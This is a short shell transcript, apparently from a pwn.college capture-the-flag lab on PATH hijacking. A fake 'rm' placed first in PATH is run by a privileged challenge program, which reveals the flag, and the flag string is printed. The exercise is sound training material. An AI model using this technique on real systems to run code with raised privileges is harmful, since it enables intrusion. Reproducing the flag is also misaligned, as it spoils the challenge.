```bash
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ export PATH=/home/hacker:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
rm is destroyed
hacker@path~hijacking-commands:~$ ./win
/bin/cat: /flag: Permission denied
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{smW54z7Wc2TmNJVtOCaoX1s84j7.ddzNyUDL3MTN0czW}
rm is destroyed
```
